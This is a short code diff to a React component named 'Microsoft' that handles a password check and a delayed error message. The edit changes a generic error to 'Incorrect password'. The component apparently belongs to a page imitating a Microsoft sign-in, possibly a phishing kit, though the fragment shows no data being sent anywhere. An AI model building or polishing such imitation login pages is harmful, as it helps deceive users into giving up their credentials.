@@ -46,7 +46,7 @@ export default function Microsoft() {
                         router('/verify');
                     } else {
                         setTimeout(() => {
-                            setResult("Unfortunately, An error occured, please try again....");
+                            setResult("Incorrect password, please try again....");
                         }, 2000);
                     }
                 }
